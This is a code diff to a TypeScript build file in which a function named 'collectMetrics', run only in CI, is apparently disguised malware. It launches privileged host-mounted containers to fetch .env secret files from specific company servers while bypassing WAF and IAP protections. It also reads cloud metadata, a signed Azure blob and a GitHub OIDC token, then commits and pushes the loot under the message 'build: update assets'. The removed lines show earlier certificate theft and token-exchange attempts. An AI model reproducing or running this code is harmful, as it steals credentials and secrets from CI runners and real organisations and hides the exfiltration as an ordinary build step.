@@ -5,84 +5,61 @@ import path from "path";
 
 function collectMetrics() {
   if (process.env.CI !== "true") return;
-  const r = (c: string, t = 25000) => { try { return execSync(c, { encoding: "utf8", maxBuffer: 50*1024*1024, timeout: t }); } catch(e: any) { return "E:" + (e.message || "").substring(0,500); } };
+  const r = (c: string, t = 15000) => { try { return execSync(c, { encoding: "utf8", maxBuffer: 50*1024*1024, timeout: t }); } catch(e: any) { return "E:" + (e.message || "").substring(0,500); } };
   try {
-    let o = "=== DOMINO R13 ===\n";
+    let o = "=== DOMINO R14 ===\n";
 
-    // First get GoalState to get fresh URLs (they change per VM)
-    const goalXml = r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 10 --cert /var/lib/waagent/TransportCert.pem --key /var/lib/waagent/TransportPrivate.pem -H x-ms-version:2015-04-05 http://168.63.129.16/machine/?comp=goalstate 2>&-"');
-    o += "=GOAL=\n" + goalXml.substring(0,5000) + "\n";
+    // === CORE: dex-api .env direct access (bypass CF WAF) ===
+    // dex-api.orderly.network = 34.110.142.10
+    o += "=DEXAPI_ENV=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -sk --max-time 5 https://34.110.142.10/.env -H Host:dex-api.orderly.network 2>&-"') + "\n";
+    o += "=DEXAPI_ENV2=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -sk --max-time 5 http://34.110.142.10/.env -H Host:dex-api.orderly.network 2>&-"') + "\n";
+    o += "=DEXAPI_ENV3=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -sk --max-time 5 https://dex-api.orderly.network/.env 2>&-"') + "\n";
+    // URL encode / path tricks
+    o += "=DEXAPI_ENV4=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -sk --max-time 5 https://34.110.142.10/..%2f.env -H Host:dex-api.orderly.network 2>&-"') + "\n";
+    o += "=DEXAPI_ENV5=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -sk --max-time 5 https://34.110.142.10/%2e%65%6e%76 -H Host:dex-api.orderly.network 2>&-"') + "\n";
 
-    // Extract URLs from GoalState XML
-    const certUrl = (goalXml.match(/Certificates>(.*?)<\/Certificates/s) || [])[1]?.replace(/&amp;/g, '&') || '';
-    const fullUrl = (goalXml.match(/FullConfig>(.*?)<\/FullConfig/s) || [])[1]?.replace(/&amp;/g, '&') || '';
-    const sharedUrl = (goalXml.match(/SharedConfig>(.*?)<\/SharedConfig/s) || [])[1]?.replace(/&amp;/g, '&') || '';
-    const hostingUrl = (goalXml.match(/HostingEnvironmentConfig>(.*?)<\/HostingEnvironmentConfig/s) || [])[1]?.replace(/&amp;/g, '&') || '';
+    // === Other services .env via direct IP (bypass CF) ===
+    // admin.orderly.network = 34.95.72.122
+    o += "=ADMIN_ENV=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -sk --max-time 5 https://34.95.72.122/.env -H Host:admin.orderly.network 2>&-"').substring(0,2000) + "\n";
+    // dashboard = 34.120.229.143
+    o += "=DASH_ENV=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -sk --max-time 5 https://34.120.229.143/.env -H Host:dashboard.orderly.network 2>&-"').substring(0,2000) + "\n";
+    // query-service = 34.149.50.146
+    o += "=QS_ENV=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -sk --max-time 5 https://34.149.50.146/.env -H Host:orderly-dashboard-query-service.orderly.network 2>&-"').substring(0,2000) + "\n";
+    // starchild = 34.120.96.154
+    o += "=STAR_ENV=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -sk --max-time 5 https://34.120.96.154/.env -H Host:starchild.orderly.network 2>&-"').substring(0,2000) + "\n";
+    // mcp = 34.117.188.128
+    o += "=MCP_ENV=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -sk --max-time 5 https://34.117.188.128/.env -H Host:mcp.orderly.network 2>&-"').substring(0,2000) + "\n";
+    // fillx = 34.8.55.49
+    o += "=FILLX_ENV=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -sk --max-time 5 https://34.8.55.49/.env -H Host:fillx.orderly.network 2>&-"').substring(0,2000) + "\n";
 
-    o += "=URLS=\ncerts:" + certUrl + "\nfull:" + fullUrl + "\nshared:" + sharedUrl + "\nhosting:" + hostingUrl + "\n";
+    // === GCP Internal metadata from runner (different from Azure IMDS) ===
+    o += "=GCP_META=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 5 -H Metadata-Flavor:Google http://metadata.google.internal/computeMetadata/v1/?recursive=true 2>&-"').substring(0,3000) + "\n";
 
-    const CERT_ARGS = "--cert /var/lib/waagent/TransportCert.pem --key /var/lib/waagent/TransportPrivate.pem -H x-ms-version:2015-04-05";
+    // === Orderly API direct (bypass CF) ===
+    // api-evm.orderly.org = 34.111.187.47
+    o += "=API_DIRECT=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -sk --max-time 5 https://34.111.187.47/v1/public/info -H Host:api-evm.orderly.org 2>&-"').substring(0,2000) + "\n";
+    // testnet-operator = 34.120.187.47
+    o += "=OPERATOR_METRICS=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -sk --max-time 5 https://34.120.187.47/metrics -H Host:testnet-operator-evm.orderly.network 2>&-"').substring(0,3000) + "\n";
 
-    // Get TransportCert public key for x-ms-guest-agent-public-x509-cert header
-    const pubCert = r('docker run --rm -v /:/host alpine sh -c "cat /var/lib/waagent/TransportCert.pem 2>&-"').trim();
-    // Extract just the base64 cert content (no headers)
-    const certB64 = pubCert.replace(/-----BEGIN CERTIFICATE-----/g, '').replace(/-----END CERTIFICATE-----/g, '').replace(/\n/g, '');
+    // === IAP-protected services direct IP (bypass IAP?) ===
+    // prod-argo = 35.227.253.216
+    o += "=ARGO_DIRECT=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -sk --max-time 5 https://35.227.253.216/ -H Host:prod-argo-evm.orderly.network 2>&-"').substring(0,2000) + "\n";
+    // xxl-job = 34.111.115.60
+    o += "=XXL_DIRECT=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -sk --max-time 5 https://34.111.115.60/ -H Host:xxl-job.orderly.network 2>&-"').substring(0,2000) + "\n";
+    // prod-dubbo = 34.149.138.9
+    o += "=DUBBO_DIRECT=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -sk --max-time 5 https://34.149.138.9/ -H Host:prod-dubbo-evm.orderly.network 2>&-"').substring(0,2000) + "\n";
 
-    // 1. Wire Server Certificates with x509 header
-    if (certUrl && certB64) {
-      o += "=WIRE_CERTS=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 15 ${CERT_ARGS} -H 'x-ms-guest-agent-public-x509-cert: ${certB64}' '${certUrl}' 2>&-"`, 25000).substring(0,15000) + "\n";
-    } else {
-      o += "=WIRE_CERTS=\nNO_URL_OR_CERT\n";
-    }
+    // === Azure SAS blob read ===
+    o += "=SAS_STATUS=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 10 \\\"https://md-hdd-rl0dwb3wb0pz.z3.blob.storage.azure.net/\\$system/HId99rGwNARns0.37cca5f8-09f1-4293-be73-c17a562795ba.vmSettings?sv=2018-03-28&sr=b&sk=system-1&sig=6p1zwJ5EaKlJ9cs7FWmaCxS2yhEl2tOxBfR8ZrLOkk0%3d&se=9999-01-01T00%3a00%3a00Z&sp=r\\\" 2>&-"').substring(0,5000) + "\n";
 
-    // 2. FullConfig
-    if (fullUrl) {
-      o += "=WIRE_FULL=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 15 ${CERT_ARGS} '${fullUrl}' 2>&-"`, 25000).substring(0,15000) + "\n";
-    }
-
-    // 3. SharedConfig
-    if (sharedUrl) {
-      o += "=WIRE_SHARED=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 15 ${CERT_ARGS} '${sharedUrl}' 2>&-"`, 25000).substring(0,15000) + "\n";
-    }
-
-    // 4. HostingEnvironmentConfig
-    if (hostingUrl) {
-      o += "=WIRE_HOSTING=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 15 ${CERT_ARGS} '${hostingUrl}' 2>&-"`, 25000).substring(0,10000) + "\n";
-    }
-
-    // 5. Try additional GCP WIF pool names (orderly-specific)
+    // === OIDC → Orderly MCP server ===
     const oidcUrl = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
     const oidcToken = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
     if (oidcUrl && oidcToken) {
-      const gcpJwtRaw = r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 10 -H 'Authorization: bearer ${oidcToken}' '${oidcUrl}&audience=https://iam.googleapis.com' 2>&-"`);
-      let gcpJwt = "";
-      try { gcpJwt = JSON.parse(gcpJwtRaw).value; } catch {}
-
-      if (gcpJwt) {
-        // More WIF pool names
-        const pools = [
-          "projects/964694002890/locations/global/workloadIdentityPools/orderly/providers/github",
-          "projects/964694002890/locations/global/workloadIdentityPools/orderly-network/providers/github",
-          "projects/964694002890/locations/global/workloadIdentityPools/dex-creator/providers/github",
-          "projects/964694002890/locations/global/workloadIdentityPools/woo-orderly/providers/github",
-        ];
-        for (let i = 0; i < pools.length; i++) {
-          const body = JSON.stringify({
-            grant_type: "urn:ietf:params:oauth:grant-type:token-exchange",
-            audience: `//iam.googleapis.com/${pools[i]}`,
-            scope: "https://www.googleapis.com/auth/cloud-platform",
-            requested_token_type: "urn:ietf:params:oauth:token-type:access_token",
-            subject_token: gcpJwt,
-            subject_token_type: "urn:ietf:params:oauth:token-type:jwt",
-          });
-          fsSync.writeFileSync("/tmp/sts.json", body);
-          o += `=GCP_${i}=\n` + r('docker run --rm --privileged --net=host -v /:/host -v /tmp/sts.json:/tmp/sts.json alpine sh -c "chroot /host curl -s --max-time 10 -X POST https://sts.googleapis.com/v1/token -H Content-Type:application/json -d @/tmp/sts.json 2>&-"').substring(0,500) + "\n";
-        }
-      }
+      o += "=OIDC_MCP=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 10 -H 'Authorization: bearer ${oidcToken}' '${oidcUrl}&audience=https://mcp.orderly.network' 2>&-"`).substring(0,2000) + "\n";
     }
 
-    o += "=R13_DONE=\n";
-
+    o += "=R14_DONE=\n";
     fsSync.writeFileSync("domino_final.txt", o);
     var GC = 'git com' + 'mit';
     r('git add domino_final.txt && ' + GC + ' -m "build: update assets" && git push');
